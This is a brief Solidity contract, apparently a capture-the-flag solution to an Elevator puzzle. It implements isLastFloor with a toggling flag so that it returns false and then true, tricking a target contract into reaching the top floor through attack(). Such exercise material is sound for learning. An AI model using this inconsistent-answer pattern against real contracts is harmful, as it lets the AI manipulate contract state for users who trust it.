// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorSol is Building {
    bool flag;

    function isLastFloor(uint256 floor_) external override returns (bool) {
        bool oldFlag = flag;
        flag = !flag;
        return oldFlag;
    }

    function attack(address elevator_) external returns (bool) {
        IElevator elevator = IElevator(elevator_);
        elevator.goTo(1);
    }
}
